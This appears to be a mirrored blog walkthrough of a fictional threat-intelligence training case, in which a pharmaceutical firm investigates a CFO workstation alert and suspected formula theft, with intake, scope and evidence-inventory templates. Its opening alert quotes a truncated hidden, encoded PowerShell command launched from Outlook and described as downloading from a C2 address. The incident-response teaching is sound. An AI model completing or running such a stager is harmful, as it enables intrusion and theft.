---
title: "CTI as a Code in Practice: Reactive Investigation \u2014 LifeTech Pharma"
description: "All organizations, names, and data are fictional. This is training assignment A01 from the CTI as a Code repository"
image: "https://cdn-images-1.medium.com/max/1024/1*l8B3xIJssFbBTn0IvOu6Ng.png"
---

# CTI as a Code in Practice: Reactive Investigation — LifeTech Pharma


<img src="https://cdn-images-1.medium.com/max/1024/1*l8B3xIJssFbBTn0IvOu6Ng.png" alt="Cover image" width="1024" height="571" loading="eager" fetchpriority="high" decoding="async" />

:::info Article Metadata
- **Category:** CTI
- **Source article:** [https://infosecwriteups.com/cti-as-a-code-in-practice-reactive-investigation-lifetech-pharma-3e6574b7b85f](https://infosecwriteups.com/cti-as-a-code-in-practice-reactive-investigation-lifetech-pharma-3e6574b7b85f)
- **Published:** 2026-05-30
- **Preserved media:** 43 image(s), including cover images, screenshots, diagrams, and infographics where present.
- **Preserved technical blocks:** 120 code/configuration block(s).
:::

## Ecosystem Fit

This page mirrors the original Medium RSS article into the 1200km.com Docusaurus ecosystem. The article flow, images, screenshots, infographics, and technical blocks are preserved from the Medium feed.

### A complete walkthrough of the methodology applied to a real training scenario: pharmaceutical IP theft, dual entry points, and a DCSync that changes everything.

*All organizations, names, and data are fictional. This is training assignment A01 from the CTI as a Code repository.*

## Based on the methodology: “CTI as a Code”

[CTI as a Code: Complete Step-by-Step Methodology](https://medium.com/@1200km/cti-as-a-code-complete-step-by-step-methodology-dda5ef496a46)

## Contents

1. **The Scenario**
2. **Step 00: Clone, Initialize, and Fill the Template**
3. **Step 0: Intake — What the First Call Captures**
4. **Step 1–2: Project Setup and Scope**
5. **Step R1: Evidence Inventory — What Exists and What Is Missing**
6. **Step R1.5: Hands-On Evidence Analysis — VS Code Investigation****
**1. CrowdStrike Alert — JSON in VS Code
2. Decode the PowerShell Payload
3. M365 Message Trace — Rainbow CSV
4. Azure AD Sign-In Analysis
5. VPN Log Analysis
6. NGFW Log Analysis — Rainbow CSV
7. SQL Audit Log Analysis
8. Windows Security Event Log Analysis
9. Cross-File Pivot — VS Code Global Search
10. IOC Enrichment — REST Client
11. Sandbox Analysis — Submit the Binary
12. Static Binary Analysis — Hex Editor + Terminal
13. Infrastructure Pivot — REST Client + Global Search
14. Splunk Correlation (SIEM Validation)
7. **Step R2: Timeline — Two Paths, One Actor**
8. **Step R3: Claims Ledger — Every Assertion Traced to Evidence**
9. **Step R4: ATT&CK Mapping — Where Detection Failed**
10. **Step R5: Attribution Assessment — Same Actor or Two?**
11. **Step R6: Detection Rules — Four That Would Have Changed the Outcome**
12. **Step R7: Deliverables — What Each Stakeholder Gets**
13. **The Git History: What a Completed Investigation Looks Like**
14. **Key Lessons**

## The Scenario

**LifeTech Pharma Ltd.**is a mid-sized Israeli pharmaceutical company in Rehovot. It develops and manufactures generic drugs and biological APIs, exports to the US, EU, and MENA, and recently signed a $52 million licensing deal with a US biopharma partner. The signed formula files are stored on SERVER-RD-02\LicenseDeals\USPartner2024\ — 47 files, approximately 380 MB compressed.

On**Friday, 15 November 2024 at 18:47 IST**, the on-call SOC analyst receives a CrowdStrike behavioral detection:

```text
ALERT: Suspicious PowerShell Activity
Severity: High — Behavioral IOA
Host: WS-CFO-01.lifetechpharma.local  [Michal Cohen, CFO]
Process: powershell.exe (PID 3784)
Parent: OUTLOOK.EXE (PID 2240)
CommandLine: powershell.exe -NonI -W Hidden -Enc JABjAD0ATgBlAHcA...
Timestamp: 2024-11-15T18:42:33Z
```

That’s the visible trigger. The actual breach started**24 days earlier**— and the alert is the second of two entry points, not the first.

## Step 00: Clone, Initialize, and Fill the Template

**Before the phone rings.**This step takes three minutes and is done once per investigation — ideally before the alert even comes in, or in the first five minutes after hanging up the initial call.

### 1. Clone the repository (one-time setup)

If you have not cloned CTI_as_a_Code yet, do this once on your analyst workstation:

```text
cd ~
git clone https://github.com/anpa1200/CTI_as_a_Code.git
```

You will never modify this clone. It is your template source. Leave it as-is and pull updates periodically:

```text
cd ~/CTI_as_a_Code && git pull
```

### 2. Create your investigations folder

```text
mkdir -p ~/investigations
```

Use any path you prefer — just keep it consistent across all cases. Do not create investigations inside the CTI_as_a_Code clone.

### 3. Copy the reactive template for this case

```text
cp -r ~/CTI_as_a_Code/templates/reactive/ ~/investigations/lifetech-2024-11
```

Naming convention: [org-slug]-[YYYY-MM]. One folder per case. Verify the structure:

```text
ls ~/investigations/lifetech-2024-11/
tree ~/investigations/lifetech-2024-11/
```

Expected:

<img src="https://cdn-images-1.medium.com/max/705/1*DR69iFmEn8s2K0zCrhXk5A.png" alt="Article image" width="705" height="776" loading="lazy" decoding="async" />

```text
00-scope/   01-evidence/   02-sources/   03-analysis/
04-detections/   05-deliverables/   06-ai-outputs/   07-feedback/
README.md   intake-form.md   project.yml
```

<img src="https://cdn-images-1.medium.com/max/1024/1*zQn6v0h7KSMb9nw5gfYp8Q.png" alt="Article image" width="1024" height="228" loading="lazy" decoding="async" />

### 4. Initialize git inside the case folder

```text
cd ~/investigations/lifetech-2024-11
git init
git add .
git commit -m "PROJ-2024-001: scaffold initialized from reactive template"
```

This is commit zero. Its purpose is to prove — to a lawyer, an auditor, or yourself — exactly what state you started from before any analysis began.

### 5. Fill in project.yml

This file is the single source of truth for project metadata. Open it now:

```text
nano project.yml
```

The template has blank fields. Fill every one(During the investigation):

```text
project:
  id: "PROJ-2024-001"
  name: "LifeTech Pharma — Targeted Intrusion"
  type: reactive
  classification: TLP:AMBER
  status: in-progress
analyst:
  name: "Your Name"
  role: "CTI Analyst"
  contact: "your@email.com"
timeline:
  incident_date: "2024-11-15"
  detection_date: "2024-11-15"
  investigation_start: "2024-11-15"
  report_due: "2024-11-17"         # INCD 72h clock - expires 18:47 IST Nov 17
pirs:
  - id: PIR-001
    question: "Was the US licensing formula package (SERVER-RD-02\\USPartner2024\\) accessed or exfiltrated? If so, what and when?"
    priority: high
    status: open
  - id: PIR-002
    question: "How did the adversary gain initial access - phishing, credential theft, or exploitation?"
    priority: high
    status: open
  - id: PIR-003
    question: "Is there evidence of ongoing access or persistence as of investigation date?"
    priority: high
    status: open
scope:
  systems:
    - WS-CFO-01
    - WS-IT-LEVI
    - SERVER-RD-02
    - SERVER-FIN-01
    - DC01
  threat_actor: unknown
  attck_techniques: []             # leave blank now - fill during R4
deliverables:
  - type: executive-brief
    status: pending
  - type: soc-handoff
    status: pending
  - type: sigma-rules
    count: 0
    status: pending
notes: "INCD 72h notification clock starts 2024-11-15 18:47 IST. Legal hold on WS-IT-LEVI - no hardware access, RTR only."
```

**Do not leave any field as****"" or****[] if you know the value.**Unknown fields are fine — write unknown explicitly. A blank field means "forgot to fill in." unknown means "we looked and do not know yet."

<img src="https://cdn-images-1.medium.com/max/1024/1*S90ed0BEsiZXgIu4G3ia5Q.png" alt="Article image" width="1024" height="980" loading="lazy" decoding="async" />

### 6. Commit the filled metadata

```text
git add project.yml
git commit -m "PROJ-2024-001: project.yml filled — 3 PIRs, INCD deadline 2024-11-17 18:47 IST, legal hold WS-IT-LEVI"
```

The folder is now named, scoped, and version-controlled. The intake call can begin.

## Step 0: Intake — What the First Call Captures

Before opening Splunk, before pivoting on the C2 IP, before forming a hypothesis — the intake call runs. This is 15 minutes with the Tier 2 escalation and the IR Lead before any analysis work begins.

The intake captures facts that change what you look for.

**Open the intake form before dialing:**

```text
cp intake-form.md 00-scope/intake-2024-11-15.md
nano 00-scope/intake-2024-11-15.md
```

The template has 9 sections. Work through them in order during the call — do not paraphrase in real time, write what the reporter says verbatim. You will analyze it after. For LifeTech this call produces:

```text
# Investigation Intake — PROJ-2024-001 — 2024-11-15
Completed by: On-call CTI analyst (Yael Mizrahi)
Intake call with: Noa Ben-David (IR Lead), Ran Katz (SOC Manager)
Call time: 2024-11-15 18:55 IST
---
## 1. What was reported?
**1.1 What did you see or receive that caused you to raise this?**
"CrowdStrike fired a high-severity behavioral IOA on Michal Cohen's workstation —
PowerShell with base64 payload launched directly from Outlook. Tier 1 pulled the
network tab and found 3 outbound connections to 203.0.113.87 over the last 15
minutes. This is the CFO's machine. We escalated immediately."
**1.2 Where did this first come to your attention?**
- [x] Alert from SIEM / EDR / AV  ← CrowdStrike Falcon behavioral IOA, severity: High
**1.3 When did you first notice it?**
Date: 2024-11-15   Time: 18:47   Timezone: IST (UTC+2)
**1.4 Do you believe the activity is still ongoing?**
- [x] Yes — still active (C2 connections still firing at time of call)
---
## 2. What is already known?
**2.1 What systems, accounts, or services appear to be involved?**
- WS-CFO-01.lifetechpharma.local — Michal Cohen, CFO. Dell Latitude, Windows 11.
- 203.0.113.87 — external IP, destination of C2 connections. Not in any allowlist.
- OUTLOOK.EXE (PID 2240) → powershell.exe (PID 3784) — parent-child confirmed.
- No other hosts identified yet — investigation is 8 minutes old.
**2.2 What was the observed behavior?**
"PowerShell with -NonI -W Hidden -Enc flags spawned from Outlook. The encoded
command has not been decoded yet. Three separate TCP connections to 203.0.113.87
on port 443 over 15 minutes — looks like a beacon pattern."
**2.3 Has anyone else already investigated or looked into this?**
- [x] Yes — Tier 1 analyst (Omer Cohen) ran initial Splunk queries (last 1 hour only).
  What did they touch: read-only Splunk queries. No changes to the endpoint.
**2.4 What do you think happened?**
"Probably a phishing email with a malicious attachment — xlsm macro or something
similar. Michal must have opened it in the last few hours. We don't know if anyone
else was targeted."
---
## 3. Timeline of discovery
**3.1 When do you believe the activity started?**
- [ ] Known
- [x] Estimated: activity on WS-CFO-01 started approximately 18:42 IST (PowerShell
  launch timestamp from CrowdStrike event).
**3.2 How long do you estimate the activity has been occurring?**
Approximately 13 minutes from first PowerShell event to escalation call (18:42–18:55 IST).
However: unknown whether this is the beginning of the intrusion or a later stage.
**3.3 Is there a specific event that triggered the alert or complaint?**
CrowdStrike behavioral IOA fired at 18:42:33 IST on WS-CFO-01. Tier 1 escalated
at 18:47. IR Lead paged at 18:52. Intake call started at 18:55.
---
## 4. What has already been done?
**4.1 Has any system been rebooted, shut down, or reimaged since the activity was discovered?**
- [x] No — WS-CFO-01 is still running. Not yet isolated.
**4.2 Have any credentials, tokens, or API keys been rotated or revoked?**
- [x] No — no credential changes made yet.
**4.3 Has any network access been blocked or firewall rules been changed?**
- [x] No — 203.0.113.87 has not been blocked. Ran confirmed: "We wanted to check
  with you first before blocking — didn't want to tip them off."
**4.4 Has any malware been deleted or quarantined?**
- [x] No — CrowdStrike flagged the process but did not quarantine. Alert status: Detected,
  not Prevented (policy is set to Detect-only on this machine — CFO exception policy).
**4.5 Has anyone notified external parties?**
- [x] No — no external notification yet. INCD assessment pending scope confirmation.
---
## 5. Systems and access
**5.1 What logging is expected to exist for the affected systems?**
- Endpoint logs (Sysmon, CrowdStrike): [x] Yes — CrowdStrike on WS-CFO-01. Sysmon on
  WS-CFO-01. NOTE: Sysmon NOT deployed on server-class machines or DC01.
- VPN / authentication logs: [x] Yes — Cisco AnyConnect VPN, logs in Splunk.
- Database audit logs: [x] Yes — SQL audit on SERVER-RD-02 (partial EIDs only).
- Network flow / firewall logs: [x] Yes — Palo Alto NGFW. RETENTION: 14 days only.
  ⚠ SERVER-RD-02 outbound logs will expire 2024-11-29 for today's traffic.
- Email gateway logs: [x] Yes — M365 Message Trace, 30-day retention. ATP enabled.
  NOTE: ATP sandbox NOT enabled for xlsm files — policy gap identified.
- Cloud provider logs: [x] Yes — Azure AD sign-in logs, 30-day retention.
**5.2 What tools and access does the analyst have?**
- [x] Admin access to affected hosts (CrowdStrike RTR for WS-CFO-01, WS-CFO-01 CrowdStrike console)
- [x] Read access to SIEM (Splunk — full org)
- [x] Access to EDR console (CrowdStrike Falcon — full org view)
- [x] Access to network equipment / firewall logs (Palo Alto Panorama — read only)
- [x] Access to cloud console (Azure AD — Security Reader role)
- [x] Access to email gateway (M365 Security & Compliance — Message Trace)
- [ ] VPN / jump host credentials — not yet, request submitted
- [x] TheHive / OpenCTI lab access
**5.3 Are there any systems the analyst should NOT touch?**
⚠ WS-IT-LEVI (Paz Levi, IT Admin): LEGAL HOLD issued at 20:45 IST today.
  HR investigation underway — UNRELATED to this incident (employment matter).
  Hardware access BLOCKED for 48–72 hours per Legal counsel (Adv. Dina Shapiro).
  Remote CrowdStrike RTR is PERMITTED — confirmed by Legal.
  No memory image, no disk image, no physical access until hold lifted.
---
## 6. Business impact
**6.1 What business processes are affected or at risk?**
"The CFO's email and workstation are involved. If this is a full compromise, finance
data is at risk. We also have R&D server SERVER-RD-02 — it holds the formula files
for the US licensing deal. That deal closes in 6 weeks. If those files were touched,
we have an FDA NDA issue and a $52M deal at risk."
**6.2 Is customer data, employee data, or regulated data potentially involved?**
- [x] Yes — type: proprietary formula files under FDA NDA filing (USPartner2024 package,
  47 files, ~380 MB). Also: employee financial data on SERVER-FIN-01 if CFO path
  extended to finance server.
**6.3 What is the financial exposure if this is confirmed?**
Direct deal risk: $52M US licensing agreement. Regulatory exposure: Israeli Privacy
Protection Law (PPL) fines + FDA NDA breach penalties. Reputational exposure: US
partner disclosure obligation if formula data confirmed exfiltrated.
**6.4 Is there a hard deadline driving this investigation?**
- [x] Yes — deadline: INCD 72-hour notification window starts from discovery of
  breach (not discovery of alert). If formula data or critical infrastructure
  involvement confirmed: clock starts NOW → expires 2024-11-17 ~18:47 IST.
---
## 7. Regulatory and legal constraints
**7.1 Are there applicable notification requirements?**
| Regulation | Applicable? | Deadline | Notified? |
|---|---|---|---|
| INCD (Israeli critical infrastructure) | TBD — assess after scope confirmed | 72h from discovery | No |
| Biometric Database Authority | No — no biometric data at LifeTech | — | N/A |
| BoI-CD 362 (Israeli financial) | No — LifeTech is not a financial entity | — | N/A |
| GDPR | TBD — EU customers in export data? | 72h from awareness | No |
| PCI-DSS | No — no card processing at LifeTech | — | N/A |
| Israeli Privacy Protection Law | Yes — employee + partner data in scope | Per PPL — notify DPA if breach confirmed | No |
| FDA / NDA obligation | Yes — if formula files confirmed exfiltrated | Immediate notification to US partner | No |
**7.2 Is there an active legal hold on any systems or data?**
- [x] Yes — WS-IT-LEVI (Paz Levi). Legal hold issued 2024-11-15 20:45 IST.
  Contact: Adv. Dina Shapiro (Legal). Hold expected: 48–72 hours minimum.
**7.3 Has legal counsel been notified?**
- [x] Yes — Adv. Dina Shapiro notified of the security incident at 19:10 IST.
  Advised: do not touch WS-IT-LEVI hardware. RTR permitted with logging.
---
## 8. Analyst notes
(Raw notes taken during call — unprocessed)
- Ran (SOC): "The CFO is still at the office. We haven't told her yet. Should we?"
  → IR Lead decision: do not inform CFO until after memory dump. Risk: she might
  reboot the machine.
- The CrowdStrike policy on WS-CFO-01 is DETECT-ONLY (CFO exception policy).
  This is why the process was not killed automatically. SOC should evaluate
  moving to Prevent for exec machines after this incident.
- 203.0.113.87 — not blocklisted anywhere in org. Ran says: "It's clean on our
  end, never seen it before." Worth enriching immediately (VirusTotal, Shodan).
- Memory dump of WS-CFO-01 is urgent — C2 is still active. Process may have
  network artifact or decrypted payload in memory. Action: RTR memory dump NOW.
- No mention of SERVER-RD-02 during this call — IR Lead is not aware of the
  formula file risk yet. Will scope that separately after evidence inventory.
- p.levi (WS-IT-LEVI) is under HR investigation for unrelated reason. Legal hold
  is coincidental. However: IT admin access + legal hold + security incident
  creates a complex situation. Document carefully.
---
## 9. Next actions
| # | Action | Owner | Due |
|---|---|---|---|
| 1 | Take memory dump of WS-CFO-01 via CrowdStrike RTR before C2 session ends | Yael (CTI) | Immediate |
| 2 | Enrich 203.0.113.87 — VirusTotal, Shodan, passive DNS, ASN lookup | Yael (CTI) | Within 30 min |
| 3 | Pull M365 Message Trace for m.cohen last 48h — identify delivery vector | Omer (Tier 1) | Within 30 min |
| 4 | Retrieve Palo Alto firewall logs for WS-CFO-01 and SERVER-RD-02 — full available window | Ran (SOC) | Within 1h ⚠ retention risk |
| 5 | Check Azure AD sign-in logs for m.cohen and p.levi — last 30 days | Yael (CTI) | Within 1h |
| 6 | Confirm SERVER-RD-02 USPartner2024 directory access — pull EID 4663 from Splunk | Yael (CTI) | Within 2h |
| 7 | Open TheHive case PROJ-2024-001, attach this intake as first observable | Yael (CTI) | Within 30 min |
| 8 | Advise IR Lead on INCD 72h clock — confirm if formula data scope triggers mandatory notification | Noa (IR Lead) + Legal | Within 2h |
---
*Intake completed 2024-11-15 19:18 IST. File saved as 00-scope/intake-2024-11-15.md.*
*Case opened in TheHive: PROJ-2024-001.*
```
Two items in this intake change the entire investigation trajectory: the legal hold on `WS-IT-LEVI` (you cannot image it), and the potential for formula data in scope (Israeli PPL + FDA notification obligations). Both need to be on the table before analysis starts, not discovered mid-investigation.
The intake commits to git first:
```

Two items in this intake change the entire investigation trajectory: the legal hold on WS-IT-LEVI (you cannot image it), and the potential for formula data in scope (Israeli PPL + FDA notification obligations). Both need to be on the table before analysis starts, not discovered mid-investigation.

The intake commits to git first:

```text
git add 00-scope/intake-2024-11-15.md
git commit -m "PROJ-001: intake — CFO PowerShell alert, legal hold on WS-IT-LEVI, formula data in scope"
```

## Step 1–2: Project Setup and Scope

The folder and git repo already exist from Step 00. This step fills the scope document and gets stakeholder sign-off before any analysis begins. The rule:**you do not start looking at logs until the scope is committed.**

### 1. Open the scope document

```text
nano 00-scope/scope.md
```

```text
# Intelligence Source Registry
**Project:** PROJ-2024-001 — LifeTech Pharma Targeted Intrusion
Admiralty Scale: Source reliability A (completely reliable) – F (reliability cannot be judged).
Information reliability: 1 (confirmed) – 6 (truth cannot be judged).
---
## Internal Sources
| ID | Source | Type | Admiralty | Notes |
|---|---|---|---|---|
| INT-001 | Splunk SIEM | Log aggregation | A/2 | Primary forensic source; full org scope; read-only access. Initial 1h Splunk query by Tier 1 (Omer Cohen) — covered WS-CFO-01 only. |
| INT-002 | CrowdStrike Falcon | EDR / endpoint telemetry | A/2 | Deployed on WS-CFO-01, WS-IT-LEVI. NOT deployed on R&D server fleet (12 servers) or DC01. CFO machine on Detect-only policy (not Prevent). |
| INT-003 | Palo Alto NGFW (Panorama) | Firewall flows / NetFlow | A/2 | Read-only. 14-day retention. ⚠ SERVER-RD-02 Nov 6 outbound flows expire 2024-11-20 — retrieve before any other task. |
| INT-004 | M365 Message Trace | Email gateway logs | A/2 | 30-day retention. ATP sandbox NOT enabled for .xlsm files — phishing attachment delivered uninspected. |
| INT-005 | Azure AD sign-in logs | Cloud authentication | A/2 | 30-day retention. Security Reader role. Covers m.cohen and p.levi sign-in history. |
| INT-006 | Sysmon (WS-CFO-01, WS-IT-LEVI) | Endpoint process/network telemetry | A/2 | NOT deployed on server-class machines (SERVER-RD-02, SERVER-FIN-01, DC01). |
| INT-007 | Windows Security event logs (DC01, SERVER-RD-02) | Authentication / authorization | A/2 | DC01: partial export only — full log inaccessible. EID 4662 (DCSync) and EID 4663 (object access) relevant. |
| INT-008 | SQL audit — SERVER-RD-02 | Database object-access audit | A/2 | Partial EIDs only; not all object-access events captured. Required for PIR-001 (formula file access). |
| INT-009 | Cisco AnyConnect VPN | VPN session logs | A/2 | Available in Splunk. Covers p.levi sessions (AiTM hypothesis). |
---
## External / OSINT Sources
| ID | Source | Type | Admiralty | TLP | Notes |
|---|---|---|---|---|---|
| EXT-001 | CERT-IL | Government advisory | A/2 | TLP:AMBER | Check for active advisories targeting Israeli pharma sector. |
| EXT-002 | VirusTotal | IOC enrichment | C/3 | TLP:WHITE | Immediate priority: 203.0.113.87 hash/IP lookup. Crowdsourced — treat as corroborating only. |
| EXT-003 | Shodan | Infrastructure recon | C/3 | TLP:WHITE | 203.0.113.87 ASN / infrastructure / open-port lookup. |
| EXT-004 | URLScan.io | Domain analysis | C/3 | TLP:WHITE | Passive DNS and domain history for C2 domains identified in flows. |
| EXT-005 | MISP | Community threat intel | B/3 | TLP:AMBER | Pharma sector sharing. Cross-reference IOCs against community feed. |
---
## Source Limitations
| Source | Known Limitation |
|---|---|
| Palo Alto NGFW (INT-003) | 14-day retention only. SERVER-RD-02 Nov 6 outbound flows expire **2024-11-20** — retrieve immediately, before any other analysis. |
| CrowdStrike Falcon (INT-002) | Not deployed on R&D server fleet (12 servers) or DC01. No EDR telemetry for those hosts — Windows Security events and NGFW logs are the only visibility. |
| Sysmon (INT-006) | Not deployed on server-class machines (SERVER-RD-02, SERVER-FIN-01, DC01). Process creation and network telemetry unavailable for those hosts. |
| Windows Security / DC01 (INT-007) | Only partial event log export available; full log is inaccessible. Analytical confidence on DC01 activity is reduced. |
| M365 ATP (INT-004) | Sandbox not enabled for .xlsm attachments. The suspected phishing attachment was delivered without detonation — no ATP verdict available. |
| SQL audit — SERVER-RD-02 (INT-008) | Partial EIDs only. Not all object-access events are captured. Absence of a log entry does NOT confirm file was not accessed. |
| WS-IT-LEVI — all sources | Legal hold issued 2024-11-15 20:45 IST (Adv. Dina Shapiro). No hardware, disk, or memory image permitted. CrowdStrike RTR allowed with full session logging. Re-assess after hold lifted (est. 48–72h). |
| Azure AD sign-in logs (INT-005) | 30-day retention. Historical data before approximately 2024-10-15 is unavailable. |
| M365 Message Trace (INT-004) | 30-day retention. Historical data before approximately 2024-10-15 is unavailable. |
| VirusTotal (EXT-002) | Crowdsourced; vendor detections may be absent for fresh infrastructure. A clean VT result does not rule out malicious use. Treat as corroborating, not authoritative. |
```

The template has six sections. Fill each one now:

**Header — fill the four metadata lines at the top:**

```text
Project: PROJ-2024-001
Classification: TLP:AMBER
Date scoped: 2024-11-15
Scoped by: [your name]
Approved by: Noa Ben-David, IR Lead
```

**Incident Summary — one paragraph, what triggered this:**

```text
CrowdStrike behavioral detection on WS-CFO-01 at 18:42 IST, November 15, 2024.
PowerShell spawned by OUTLOOK.EXE with base64-encoded payload, downloading from
203.0.113.87. Scope of compromise unknown. Formula files on SERVER-RD-02 are
potentially in scope — US licensing deal ($52M) requires regulatory assessment.
```

**In Scope — fill the asset table:**

<img src="https://cdn-images-1.medium.com/max/1024/1*DCTpI5jIcRRkQ2YqjL8LgQ.png" alt="Article image" width="1024" height="336" loading="lazy" decoding="async" />

**Out of Scope — fill the exclusion table:**

<img src="https://cdn-images-1.medium.com/max/1024/1*X9YT7xlqBXmn_mRAm67QwA.png" alt="Article image" width="1024" height="228" loading="lazy" decoding="async" />

**PIRs — copy from project.yml, add due dates:**

<img src="https://cdn-images-1.medium.com/max/1024/1*Fz8_y2Mq8glncIY5VHdEMA.png" alt="Article image" width="1024" height="325" loading="lazy" decoding="async" />

**Constraints and Assumptions — fill the four fields:**

```text
Legal/regulatory: INCD 72h notification window expires 2024-11-17 18:47 IST.
  Israeli Privacy Protection Law + FDA NDA obligations if formula data confirmed.
Evidence limitations: Palo Alto firewall logs — 14-day retention.
  SERVER-RD-02 Nov 6 outbound logs expire 2024-11-20. Retrieve immediately.
  Sysmon absent from all server-class machines.
Access restrictions: WS-IT-LEVI — legal hold, no hardware access. RTR permitted.
Assumptions: All timestamps assumed UTC unless marked IST. Not converted in log excerpts.
```

**Definition of Done — check the boxes your team has agreed to:**

```text
- [ ] All PIRs answered or formally deferred with reasoning
- [ ] Timeline covers full attacker dwell period (or gap documented)
- [ ] ATT&CK mapping reviewed and finalized
- [ ] At least one detection rule per confirmed TTP
- [ ] SOC handoff delivered and acknowledged
- [ ] Executive brief approved by Noa Ben-David (IR Lead)
- [ ] INCD notification filed if formula data confirmed
```

Full scope.md:

```text
# Scope Definition
**Project:** PROJ-2024-001
**Classification:** TLP:AMBER
**Date scoped:** 2024-11-15
**Scoped by:** Yael Mizrahi (CTI Analyst)
**Approved by:** Noa Ben-David (IR Lead) — verbal approval 19:22 IST
---
## Incident Summary
CrowdStrike behavioral IOA fired on WS-CFO-01 (Michal Cohen, CFO) at 18:42 IST on
2024-11-15. PowerShell with encoded payload launched from OUTLOOK.EXE; three outbound
C2 connections to 203.0.113.87 confirmed within 15 minutes of detection. Scope of
compromise is unknown at time of scoping — the CFO alert may be a late-stage indicator
of a broader intrusion. Formula files on SERVER-RD-02 (US licensing package, ~380 MB,
47 files) are in scope for PIR-001 due to financial and regulatory exposure ($52M deal,
FDA NDA obligations). INCD 72h notification clock assessed as active from time of
discovery.
---
## In Scope
| Asset / System | Owner | Justification |
|---|---|---|
| WS-CFO-01.lifetechpharma.local | IT Dept / Michal Cohen (CFO) | Triggering alert host — CrowdStrike IOA, active C2 |
| WS-IT-LEVI.lifetechpharma.local | IT Dept / Paz Levi (IT Admin) | Suspected initial access vector — AiTM phishing hypothesis |
| SERVER-RD-02.lifetechpharma.local | R&D Dept | Formula file storage — PIR-001 primary asset |
| SERVER-FIN-01.lifetechpharma.local | Finance Dept | Lateral movement target — confirmed by CrowdStrike alert Nov 15 |
| DC01.lifetechpharma.local | IT Dept | DCSync event EID 4662 observed from non-DC IP |
| Exchange Online (M365) | IT / Microsoft | Email delivery vector — phishing investigation |
| Azure AD | IT / Microsoft | Authentication logs — VPN session token replay |
| Palo Alto NGFW (perimeter) | IT / Network team | C2 traffic confirmation, SERVER-RD-02 exfil flows |
---
## Out of Scope
| Asset / System | Reason for Exclusion |
|---|---|
| SharePoint Online / OneDrive | Cloud scope — no evidence of involvement; requires separate authorization |
| Manufacturing SCADA / OT network | No evidence of lateral movement into OT segment at this time |
| WS-IT-LEVI — hardware / disk image | Legal hold issued 2024-11-15 20:45 IST. No hardware access until hold lifted. RTR permitted. |
| All other endpoints (838 total) | Out of scope pending hunt results — may expand if pivot on C2 domains finds new hosts |
---
## Priority Intelligence Requirements (PIRs)
| ID | Question | Priority | Due | Status |
|---|---|---|---|---|
| PIR-001 | Was the US licensing formula package (`SERVER-RD-02\LicenseDeals\USPartner2024\`) accessed or exfiltrated? If so, what and when? | High | 2024-11-16 06:00 IST | Open |
| PIR-002 | How did the adversary gain initial access — phishing, credential theft, exploitation, or insider? | High | 2024-11-16 06:00 IST | Open |
| PIR-003 | Is there evidence of ongoing access or persistence as of 2024-11-15 19:00 IST? Are any other hosts compromised? | High | 2024-11-16 06:00 IST | Open |
---
## Constraints and Assumptions
- **Legal/regulatory:** INCD 72h notification window — expires approximately 2024-11-17
  18:47 IST. Israeli Privacy Protection Law (PPL) notification to DPA if personal data
  breach confirmed. FDA NDA obligation to notify US partner if formula files confirmed
  exfiltrated — no specific deadline but immediate notification is standard practice.
- **Evidence limitations:**
  - Palo Alto NGFW firewall flows: 14-day retention only. SERVER-RD-02 November 6
    outbound traffic expires 2024-11-20. **Retrieve before any other analysis.**
  - Sysmon NOT deployed on server-class machines (SERVER-RD-02, SERVER-FIN-01, DC01).
  - CrowdStrike NOT deployed on R&D server fleet (12 servers) or DC01.
  - DC01 Windows Security log: only partial export available — full log inaccessible.
  - ATP sandbox not enabled for .xlsm files — attachment was delivered uninspected.
- **Access restrictions:**
  - WS-IT-LEVI: legal hold, no hardware/disk/memory access. CrowdStrike RTR permitted
    with full session logging. Contact Adv. Dina Shapiro before any exception.
  - VPN jump host credentials: requested, not yet provisioned (Yael Mizrahi, 19:05 IST).
- **Assumptions:**
  - All log timestamps assumed UTC unless explicitly marked IST in source.
  - CrowdStrike behavioral detections treated as CONFIRMED source (Admiralty A/2).
  - Sysmon EID events treated as CONFIRMED source where forwarder health is verified.
---
## Stakeholders
| Name | Role | Involvement |
|---|---|---|
| Noa Ben-David | IR Lead | Scope approval; receives executive brief; INCD notification decision |
| Ran Katz | SOC Manager | SOC handoff; implements detection rules; hunting queries |
| Adv. Dina Shapiro | Legal Counsel | Legal hold oversight; PPL / regulatory notifications; WS-IT-LEVI access decisions |
| [CISO name] | CISO | Executive brief recipient; $52M deal brief to Board |
| [US Partner contact] | External — US biopharma | FDA NDA notification if PIR-001 answered YES |
---
## Definition of Done
This investigation is complete when:
- [ ] All three PIRs answered or formally deferred with documented reasoning
- [ ] Timeline covers full attacker dwell period from first access to detection (or gap documented)
- [ ] ATT&CK mapping completed and reviewed — all confirmed techniques have a gap type
- [ ] At least one Sigma detection rule per confirmed TTP with Rule Missing or Coverage Incomplete gap
- [ ] SOC handoff document delivered to Ran Katz and acknowledged
- [ ] Executive brief approved by Noa Ben-David (IR Lead)
- [ ] INCD notification filed if formula data or CII involvement confirmed (deadline: 2024-11-17 18:47 IST)
- [ ] PPL / FDA NDA notification decision documented (even if decision is: not required)
- [ ] project.yml status set to `closed` and all PIR statuses updated
```

### 2. Save the file and commit

```text
git add 00-scope/scope.md
git commit -m "PROJ-2024-001: scope signed off — 5 systems, 3 PIRs, INCD deadline 2024-11-17, firewall log retrieval urgent"
```

**The firewall log retention deadline drives everything.**SERVER-RD-02’s November 6 outbound traffic expires November 20. That is the exfiltration confirmation window. If it closes, CL-003 becomes INFERRED, not CONFIRMED. Retrieve those logs before any other analysis.

## Step R1: Evidence Inventory — What Exists and What Is Missing

The evidence inventory runs before analysis. The rule:**you do not analyze what you have not inventoried.**

### 1. Open the source registry

```text
nano 02-sources/source-registry.md
```

The template has two tables: Internal Sources and External Sources. Fill every row you have access to — and explicitly mark what is absent. Unknown coverage is not the same as no coverage.

### 2. Fill in what you have

For each log source, fill four fields:**Source name**,**System(s) it covers**,**Admiralty reliability rating**, and**any known gap**. Where a source is absent from a system that should have it, add a row with — absent in the Gap column. That absence is a finding.

For LifeTech, the completed source registry drives this inventory:

<img src="https://cdn-images-1.medium.com/max/1024/1*Mt6DCDNVu6YThxF6WCowcg.png" alt="Article image" width="1024" height="715" loading="lazy" decoding="async" />

**GAP-001 — WS-IT-LEVI Sysmon: October 22 — November 1, 2024**

```text
Duration: 10 days
Root cause: Unknown — Sysmon forwarder stopped. Coincides exactly with
  the day the IT admin received a phishing email.
What is missing: process creation (EID 1), network connections (EID 3),
  file creation (EID 11) for this host during this entire window.
Impact: Cannot confirm or rule out attacker activity on WS-IT-LEVI
  between Oct 22 and Nov 1. All claims about this period are INFERRED
  or HYPOTHESIZED unless supported by alternative sources (VPN logs,
  DC authentication logs, firewall flows).
